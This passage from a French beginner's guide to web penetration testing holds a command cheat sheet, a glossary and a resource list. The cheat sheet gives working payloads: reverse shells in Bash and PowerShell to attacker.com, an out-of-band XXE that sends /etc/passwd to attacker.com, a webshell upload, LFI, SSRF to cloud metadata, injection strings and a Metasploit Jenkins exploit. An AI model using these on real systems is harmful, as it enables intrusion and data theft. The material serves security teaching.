##### Reconnaissance

```bash
# Scan de ports avec Nmap
nmap -sC -sV -p- -oA scan_complet target.com

# Découverte de sous-domaines
subfinder -d target.com -o subdomains.txt
amass enum -d target.com -o amass_results.txt

# Énumération de contenu web
gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster_results.txt

# Capture d'écran automatisée
aquatone -out ./aquatone < subdomains.txt
```

##### Exploitation de vulnérabilités courantes

```bash
# Test d'injection SQL
sqlmap -u "https://target.com/page.php?id=1" --dbs --batch

# Test XSS automatisé
xsser --url "https://target.com/search?q=test" --auto

# Test SSRF
curl -v "https://target.com/api?url=http://localhost:22"

# Test LFI
curl -v "https://target.com/page.php?file=../../../etc/passwd"

# Test d'upload de fichiers
curl -F "file=@webshell.php;filename=image.jpg.php" https://target.com/upload.php
```

##### Post-exploitation

```bash
# Reverse shell one-liner (Bash)
bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'

# Reverse shell one-liner (PowerShell)
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "New-Object System.Net.Sockets.TCPClient('attacker.com',4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Listener Netcat
nc -lvnp 4444

# Stabilisation de shell
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z puis:
stty raw -echo; fg
```

#### Payloads pour tests rapides

##### XSS

```javascript
// XSS basique
<script>alert(document.domain)</script>

// XSS avec événement
<img src=x onerror=alert(document.domain)>

// XSS avec encodage HTML
&lt;script&gt;alert(document.domain)&lt;/script&gt;

// XSS DOM
<script>document.getElementById("demo").innerHTML = location.hash.substring(1);</script>
```

##### Injection SQL

```sql
-- Détection basique
' OR '1'='1
' OR 1=1 --
' UNION SELECT 1,2,3 --

-- Extraction de données
' UNION SELECT 1,database(),3 --
' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema='database_name' --
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users' --

-- Injection basée sur le temps
' OR (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END) --
```

##### NoSQL Injection

```javascript
// MongoDB - Bypass d'authentification
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": "admin", "password": {"$regex": "^a.*"}}

// MongoDB - Opérateurs
{"$where": "this.username == 'admin'"}
{"field": {"$in": [null, "value"]}}
```

##### SSRF

```
// URLs pour tester SSRF
http://localhost:22
http://127.0.0.1:3306
http://169.254.169.254/latest/meta-data/ (AWS)
http://metadata.google.internal/ (GCP)

// Contournements de filtres
http://127.0.0.1
http://localhost
http://[::1]
http://2130706433 (décimal)
http://0x7f000001 (hexadécimal)
```

##### XXE

```xml
<!-- XXE basique -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>

<!-- XXE pour SSRF -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-service:8080">]>
<foo>&xxe;</foo>

<!-- XXE Out-of-Band -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<foo>&send;</foo>

<!-- evil.dtd -->
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%all;
```

#### Outils essentiels et leurs options

##### Burp Suite

```
# Scope configuration
^https?://.*\.target\.com/.*$

# Intruder payloads
§payload§

# Match/replace rules
Search: [a-zA-Z0-9]{32}
Replace: DETECTED_TOKEN

# Extensions utiles
- Active Scan++
- Autorize
- Turbo Intruder
- JWT Toolkit
- CSRF Scanner
```

##### OWASP ZAP

```
# Scan automatisé
zap-cli quick-scan --self-contained --start-options "-config api.disablekey=true" https://target.com

# API scan
zap-api-scan.py -t https://target.com/api/v1/swagger.json -f openapi

# Scan passif uniquement
zap-cli -p 8090 spider https://target.com
zap-cli -p 8090 active-scan --scanners xss,sqli https://target.com
```

##### Metasploit

```
# Scan de vulnérabilités web
use auxiliary/scanner/http/dir_scanner
set RHOSTS target.com
set THREADS 10
run

# Exploitation de vulnérabilités
use exploit/multi/http/jenkins_script_console
set RHOST target.com
set RPORT 8080
set TARGETURI /jenkins/
exploit
```

#### Tableaux de référence rapide

##### Codes de statut HTTP importants

| Code | Description | Implications de sécurité |
|------|-------------|--------------------------|
| 200 | OK | Ressource accessible |
| 301/302 | Redirection | Peut révéler des redirections non sécurisées |
| 401 | Non autorisé | Authentification requise |
| 403 | Interdit | Ressource existe mais accès refusé |
| 404 | Non trouvé | Ressource n'existe pas |
| 405 | Méthode non autorisée | Méthode HTTP non supportée |
| 500 | Erreur serveur | Peut révéler des erreurs d'application |

##### En-têtes de sécurité HTTP

| En-tête | Exemple | Fonction |
|---------|---------|----------|
| Content-Security-Policy | default-src 'self' | Prévention XSS |
| X-XSS-Protection | 1; mode=block | Protection XSS (obsolète) |
| X-Frame-Options | DENY | Prévention clickjacking |
| X-Content-Type-Options | nosniff | Prévention MIME sniffing |
| Strict-Transport-Security | max-age=31536000 | Force HTTPS |
| Access-Control-Allow-Origin | https://trusted.com | Configuration CORS |

##### Ports communs et services

| Port | Service | Implications |
|------|---------|--------------|
| 21 | FTP | Transfert de fichiers, souvent non chiffré |
| 22 | SSH | Accès shell sécurisé |
| 23 | Telnet | Accès shell non chiffré |
| 25 | SMTP | Serveur mail |
| 53 | DNS | Résolution de noms |
| 80 | HTTP | Web non chiffré |
| 443 | HTTPS | Web chiffré |
| 445 | SMB | Partage de fichiers Windows |
| 1433 | MSSQL | Base de données Microsoft |
| 3306 | MySQL | Base de données MySQL |
| 3389 | RDP | Bureau à distance Windows |
| 5432 | PostgreSQL | Base de données PostgreSQL |
| 8080 | HTTP Alt | Souvent utilisé pour les applications web |
| 8443 | HTTPS Alt | Souvent utilisé pour les interfaces d'administration |

**En clair, pour un débutant :**
Cette section "Quick Ops" est comme un aide-mémoire du pentesteur web. Elle contient les commandes essentielles pour chaque phase d'un test d'intrusion : reconnaissance (trouver ce qui existe), exploitation (attaquer les faiblesses) et post-exploitation (que faire une fois entré). Les payloads sont des morceaux de code prêts à l'emploi pour tester différentes vulnérabilités, comme injecter du JavaScript malveillant ou contourner l'authentification d'une base de données. Les tableaux de référence vous aident à interpréter rapidement les réponses des serveurs et à identifier les configurations de sécurité. C'est l'équivalent d'avoir toutes vos formules mathématiques sur une feuille pendant un examen - indispensable quand vous êtes sous pression !

### Glossaire

#### Termes et concepts essentiels en pentest web

##### A

**AJAX (Asynchronous JavaScript and XML)** : Technique permettant de mettre à jour une page web de façon asynchrone en échangeant des données avec un serveur en arrière-plan.

**API (Application Programming Interface)** : Ensemble de définitions et de protocoles qui facilite la création et l'intégration de logiciels d'applications.

**Authentification** : Processus de vérification de l'identité d'un utilisateur, généralement via un nom d'utilisateur et un mot de passe.

**Autorisation** : Processus qui détermine ce qu'un utilisateur authentifié est autorisé à faire.

##### B

**Backdoor** : Code malveillant qui permet à un attaquant de contourner l'authentification normale pour accéder à un système.

**Blind SQL Injection** : Type d'injection SQL où l'attaquant ne voit pas directement les résultats de l'injection.

**Brute Force** : Technique consistant à essayer systématiquement toutes les combinaisons possibles pour trouver un mot de passe ou une clé.

**Buffer Overflow** : Vulnérabilité où un programme écrit plus de données dans un tampon (buffer) qu'il ne peut en contenir.

##### C

**CSRF (Cross-Site Request Forgery)** : Attaque qui force un utilisateur authentifié à exécuter des actions non désirées sur une application web.

**CSP (Content Security Policy)** : Mécanisme de sécurité qui permet de restreindre les ressources qu'une page peut charger.

**Cookie** : Petit fichier texte stocké par le navigateur qui permet de maintenir des informations d'état entre les requêtes HTTP.

**CORS (Cross-Origin Resource Sharing)** : Mécanisme qui permet à des ressources web d'être accessibles depuis un autre domaine.

##### D

**DOM (Document Object Model)** : Interface de programmation qui représente la structure d'un document HTML ou XML.

**DoS (Denial of Service)** : Attaque visant à rendre un service indisponible en surchargeant ses ressources.

**Directory Traversal** : Vulnérabilité permettant d'accéder à des fichiers en dehors du répertoire racine d'un site web.

**DNS (Domain Name System)** : Système qui traduit les noms de domaine en adresses IP.

##### E

**Enumeration** : Phase de reconnaissance active où l'attaquant collecte des informations sur les systèmes cibles.

**Exploit** : Code ou technique qui tire parti d'une vulnérabilité pour compromettre un système.

**Exfiltration** : Processus de transfert non autorisé de données depuis un système compromis vers l'attaquant.

**Encryption** : Processus de conversion de données en format codé pour empêcher l'accès non autorisé.

##### F

**Firewall** : Système de sécurité qui surveille et filtre le trafic réseau entrant et sortant.

**Fingerprinting** : Technique pour identifier le type et la version d'un système d'exploitation ou d'une application.

**Fuzzing** : Technique de test qui consiste à injecter des données aléatoires ou malformées dans une application.

**File Inclusion** : Vulnérabilité permettant d'inclure des fichiers locaux (LFI) ou distants (RFI) dans l'exécution d'une application.

##### H

**HSTS (HTTP Strict Transport Security)** : Mécanisme de sécurité qui force les connexions via HTTPS.

**HTTP (Hypertext Transfer Protocol)** : Protocole de communication utilisé pour transférer des données sur le web.

**HTTPS (HTTP Secure)** : Version sécurisée de HTTP, utilisant TLS/SSL pour chiffrer les communications.

**Header** : Partie d'une requête ou d'une réponse HTTP qui contient des métadonnées sur la communication.

##### I

**IDOR (Insecure Direct Object Reference)** : Vulnérabilité où une application expose une référence à un objet interne sans contrôle d'accès.

**IDS/IPS (Intrusion Detection/Prevention System)** : Système qui surveille le réseau pour détecter et bloquer les activités malveillantes.

**Injection** : Classe de vulnérabilités où des données non fiables sont envoyées à un interpréteur comme partie d'une commande ou requête.

**IP (Internet Protocol)** : Protocole de communication qui régit l'adressage et le routage des paquets de données sur Internet.

##### J

**JWT (JSON Web Token)** : Standard ouvert pour transmettre de manière sécurisée des informations entre parties sous forme d'objet JSON.

**JavaScript** : Langage de programmation qui permet d'ajouter des fonctionnalités interactives aux sites web.

**JSONP (JSON with Padding)** : Technique utilisée pour contourner la politique de même origine en chargeant des données JSON via des balises script.

**Jailbreaking** : Processus de suppression des restrictions logicielles imposées par le système d'exploitation d'un appareil.

##### L

**LDAP (Lightweight Directory Access Protocol)** : Protocole d'accès aux services d'annuaire.

**LFI (Local File Inclusion)** : Vulnérabilité permettant d'inclure des fichiers locaux dans l'exécution d'une application.

**Load Balancer** : Dispositif qui distribue le trafic réseau sur plusieurs serveurs pour optimiser les ressources.

**Log** : Enregistrement chronologique des événements survenus dans un système informatique.

##### M

**MFA (Multi-Factor Authentication)** : Méthode d'authentification qui requiert deux ou plusieurs facteurs de vérification.

**MITM (Man-in-the-Middle)** : Attaque où l'attaquant s'interpose secrètement dans une communication entre deux parties.

**Malware** : Logiciel malveillant conçu pour endommager, infiltrer ou prendre le contrôle d'un système.

**Metadata** : Données qui fournissent des informations sur d'autres données.

##### N

**NTLM (NT LAN Manager)** : Protocole d'authentification Microsoft utilisé dans les environnements Windows.

**NoSQL** : Terme désignant les bases de données non relationnelles.

**Nonce** : Nombre aléatoire utilisé une seule fois dans une communication cryptographique.

**Network Scanning** : Processus d'identification des hôtes actifs, ports ouverts et services sur un réseau.

##### O

**OWASP (Open Web Application Security Project)** : Organisation qui travaille à améliorer la sécurité des logiciels.

**OAuth** : Protocole d'autorisation ouvert permettant un accès sécurisé à des API.

**ORM (Object-Relational Mapping)** : Technique de programmation pour convertir des données entre systèmes incompatibles.

**OSINT (Open Source Intelligence)** : Collecte d'informations à partir de sources publiquement disponibles.

##### P

**Payload** : Partie d'un code malveillant qui exécute une action non désirée.

**Phishing** : Technique d'ingénierie sociale visant à obtenir des informations sensibles en se faisant passer pour une entité de confiance.

**Proxy** : Serveur intermédiaire qui agit comme passerelle entre un client et un serveur.

**Port Scanning** : Technique pour identifier les ports ouverts sur un système.

##### R

**RCE (Remote Code Execution)** : Vulnérabilité permettant à un attaquant d'exécuter du code arbitraire sur un système distant.

**RBAC (Role-Based Access Control)** : Méthode de régulation de l'accès aux ressources basée sur les rôles des utilisateurs.

**RFI (Remote File Inclusion)** : Vulnérabilité permettant d'inclure des fichiers distants dans l'exécution d'une application.

**Reverse Shell** : Connexion shell initiée depuis la machine cible vers l'attaquant.

##### S

**SQL Injection** : Technique d'injection de code qui exploite une vulnérabilité dans une application interagissant avec une base de données.

**SSRF (Server-Side Request Forgery)** : Vulnérabilité permettant à un attaquant de forcer le serveur à effectuer des requêtes.

**Same-Origin Policy** : Mécanisme de sécurité qui restreint la façon dont un document ou script d'une origine peut interagir avec les ressources d'une autre origine.

**Session** : Période pendant laquelle un utilisateur interagit avec une application web.

##### T

**TLS (Transport Layer Security)** : Protocole cryptographique conçu pour sécuriser les communications sur un réseau.

**Two-Factor Authentication (2FA)** : Méthode d'authentification qui requiert deux types différents d'identification.

**Token** : Objet qui représente le droit d'effectuer certaines opérations.

**Threat Model** : Processus d'identification, quantification et traitement des risques de sécurité.

##### U

**URL (Uniform Resource Locator)** : Adresse web qui spécifie l'emplacement d'une ressource sur Internet.

**UAC (User Account Control)** : Fonctionnalité de sécurité de Windows qui empêche les modifications non autorisées du système.

**UXSS (Universal Cross-Site Scripting)** : Vulnérabilité XSS qui affecte le navigateur lui-même plutôt qu'un site spécifique.

**UUID (Universally Unique Identifier)** : Identifiant standard utilisé dans la construction de logiciels.

##### V

**VPN (Virtual Private Network)** : Technologie qui crée une connexion chiffrée sur un réseau moins sécurisé.

**Vulnerability** : Faiblesse dans un système qui peut être exploitée pour compromettre sa sécurité.

**Validation** : Processus de vérification que les données d'entrée respectent certains critères.

**Virtual Host** : Méthode permettant d'héberger plusieurs noms de domaine sur un seul serveur.

##### W

**WAF (Web Application Firewall)** : Appliance, plugin ou filtre qui applique un ensemble de règles sur le trafic HTTP.

**WebSocket** : Protocole de communication qui permet des connexions interactives entre un navigateur et un serveur.

**Whitelist** : Liste d'éléments autorisés, par opposition à une blacklist.

**WYSIWYG (What You See Is What You Get)** : Type d'éditeur qui permet de voir le résultat final pendant l'édition.

##### X

**XSS (Cross-Site Scripting)** : Vulnérabilité permettant d'injecter du code malveillant dans des pages web vues par d'autres utilisateurs.

**XML (eXtensible Markup Language)** : Langage de balisage qui définit un ensemble de règles pour encoder des documents.

**XXE (XML External Entity)** : Vulnérabilité dans le traitement XML qui permet d'accéder à des ressources externes.

**X-Frame-Options** : En-tête HTTP qui peut être utilisé pour indiquer si un navigateur doit être autorisé à rendre une page dans un frame.

##### Z

**Zero-day** : Vulnérabilité inconnue du fabricant du logiciel et pour laquelle aucun correctif n'est disponible.

**Zone Transfer** : Processus par lequel un serveur DNS secondaire obtient une copie de la zone DNS d'un serveur primaire.

**ZIP Slip** : Vulnérabilité d'extraction d'archives qui permet l'écriture de fichiers arbitraires.

**Zombie** : Ordinateur compromis contrôlé à distance par un attaquant, souvent utilisé dans les botnets.

**En clair, pour un débutant :**
Ce glossaire est comme un dictionnaire spécialisé qui vous aide à comprendre le jargon du pentest web. Chaque terme technique est expliqué simplement, ce qui vous permet de suivre les discussions entre experts et de comprendre la documentation technique. Par exemple, au lieu de vous demander ce qu'est un "CSRF", vous apprenez qu'il s'agit d'une attaque qui force un utilisateur connecté à effectuer des actions sans son consentement. C'est particulièrement utile pour les débutants qui se sentent souvent submergés par les acronymes et termes spécialisés du domaine de la cybersécurité.

### Conclusion et ressources

#### Récapitulatif du parcours d'apprentissage

Ce guide vous a fait progresser à travers plusieurs niveaux de compétence en pentest web :

1. **Niveau débutant** : Comprendre les fondamentaux du web, HTTP, et les bases de la sécurité
2. **Niveau intermédiaire** : Maîtriser les outils essentiels et les vulnérabilités courantes
3. **Niveau avancé** : Explorer des techniques sophistiquées d'attaque et de contournement
4. **Niveau expert** : Appliquer des méthodologies complètes et comprendre les vulnérabilités complexes

Vous avez acquis des compétences dans :
- L'utilisation d'outils professionnels comme Burp Suite
- L'exploitation de diverses vulnérabilités (XSS, SQLi, CSRF, etc.)
- L'analyse et le contournement de mécanismes de sécurité
- La documentation et la communication des résultats

#### Conseils pour continuer à progresser

1. **Pratiquez régulièrement** :
   - Participez à des CTF (Capture The Flag)
   - Utilisez des plateformes d'entraînement comme HackTheBox, TryHackMe, VulnHub
   - Créez votre propre laboratoire avec des applications vulnérables

2. **Restez à jour** :
   - Suivez les blogs de sécurité et les flux RSS
   - Participez à des conférences (virtuelles ou physiques)
   - Rejoignez des communautés de sécurité (forums, Discord, Slack)

3. **Spécialisez-vous** :
   - Choisissez un domaine qui vous passionne (mobile, IoT, cloud)
   - Approfondissez vos connaissances dans des technologies spécifiques
   - Développez une expertise reconnue dans un créneau particulier

4. **Contribuez à la communauté** :
   - Partagez vos découvertes et outils
   - Participez à des programmes de bug bounty
   - Mentorez des débutants

#### Ressources recommandées

##### Livres essentiels

- "The Web Application Hacker's Handbook" par Dafydd Stuttard et Marcus Pinto
- "Real-World Bug Hunting" par Peter Yaworski
- "Bug Bounty Bootcamp" par Vickie Li
- "Mastering Modern Web Penetration Testing" par Prakhar Prasad
- "Advanced Penetration Testing" par Wil Allsopp

##### Cours en ligne

- [Offensive Security Web Expert (OSWE)](https://www.offensive-security.com/awae-oswe/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security) (gratuit)
- [PentesterLab](https://pentesterlab.com/)
- [eLearnSecurity Web Application Penetration Tester (eWAPT)](https://elearnsecurity.com/product/ewpt-certification/)
- [SANS SEC542: Web App Penetration Testing and Ethical Hacking](https://www.sans.org/cyber-security-courses/web-app-penetration-testing-ethical-hacking/)

##### Sites d'entraînement

- [HackTheBox](https://www.hackthebox.eu/)
- [TryHackMe](https://tryhackme.com/)
- [VulnHub](https://www.vulnhub.com/)
- [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/)
- [WebGoat](https://owasp.org/www-project-webgoat/)

##### Blogs et sites de référence

- [PortSwigger Research](https://portswigger.net/research)
- [HackerOne Hacktivity](https://hackerone.com/hacktivity)
- [Project Zero](https://googleprojectzero.blogspot.com/)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [The Daily Swig](https://portswigger.net/daily-swig)

##### Outils à maîtriser

- [Burp Suite](https://portswigger.net/burp)
- [OWASP ZAP](https://www.zaproxy.org/)
- [Metasploit Framework](https://www.metasploit.com/)
- [Nmap](https://nmap.org/)
- [Sqlmap](http://sqlmap.org/)
- [Nuclei](https://github.com/projectdiscovery/nuclei)
- [Amass](https://github.com/OWASP/Amass)

##### Communautés

- [Reddit r/netsec](https://www.reddit.com/r/netsec/)
- [Stack Exchange Information Security](https://security.stackexchange.com/)
- [OWASP Slack](https://owasp.org/slack/invite)
- [Discord Bug Bounty Hunter](https://discord.gg/bugbounty)
- [Twitter #infosec](https://twitter.com/hashtag/infosec)

#### Mot de la fin

Le pentest web est un domaine en constante évolution. Les technologies, les vulnérabilités et les méthodes de défense changent rapidement. Ce qui fait un bon pentesteur, ce n'est pas seulement la maîtrise technique, mais aussi la curiosité, la persévérance et la capacité à penser de manière créative.

Rappelez-vous que la sécurité est un processus, pas un produit. Continuez à apprendre, à vous adapter et à partager vos connaissances avec la communauté.

Enfin, n'oubliez jamais l'éthique : obtenez toujours les autorisations nécessaires avant de tester un système, respectez la portée définie, et signalez les vulnérabilités de manière responsable.

Bonne chance dans votre parcours de pentesteur web !

**En clair, pour un débutant :**
Cette section finale est comme une carte routière pour votre avenir en cybersécurité. Elle résume tout ce que vous avez appris et vous montre comment continuer à progresser. Les conseils pratiques (comme participer à des CTF ou rejoindre des communautés) vous aident à appliquer vos connaissances dans le monde réel. La liste de ressources est un trésor : livres de référence, cours en ligne, sites d'entraînement et outils essentiels. C'est comme si un mentor expérimenté vous prenait sous son aile et vous disait : "Voici tout ce dont tu as besoin pour réussir". Le mot de la fin vous rappelle que ce domaine évolue constamment et que l'éthique doit toujours guider vos actions - une leçon cruciale pour tout professionnel de la sécurité.
